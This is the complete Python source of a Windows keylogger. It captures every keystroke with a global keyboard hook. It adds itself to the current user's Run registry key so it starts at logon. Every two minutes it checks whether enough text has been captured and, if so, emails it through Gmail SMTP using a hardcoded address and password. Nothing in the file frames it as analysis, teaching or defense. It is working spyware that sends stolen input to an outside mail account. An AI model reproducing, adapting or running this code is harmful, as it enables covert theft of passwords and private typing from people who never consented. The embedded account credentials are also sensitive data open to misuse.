try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)

import os
import sys
import threading
import urllib,urllib2
import smtplib
import datetime,time
import win32event, win32api, winerror
from _winreg import *

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)
data=''
count=0

# Add to startup
def addStartup():
    fp=os.path.dirname(os.path.realpath('__file__'))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "FabVinKevJim-key",0,REG_SZ, new_file_path)

#Email Logs
class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            global data
            if len(data)>100:
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com" #Specify Server Here
                PORT = 587 #Specify Port Here
                USER="hackrinz@gmail.com"#Specify Username Here 
                PASS="psgsquare77"#Specify Password Here
                FROM = USER#From address is taken from username
                TO = ["hackrinz@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
                SUBJECT = "Keylogger data: "+str(ts)
                MESSAGE = data
                message = """\
From: %s
To: %s
Subject: %s
%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, message)
                    data=''
                    server.quit()
                except Exception as e:
                    print e
            self.event.wait(120)

def main():
    addStartup() 
    email=TimerClass()
    email.start()
    return True

if __name__ == '__main__':
    main()

def keypressed(event):
    global data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys 

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()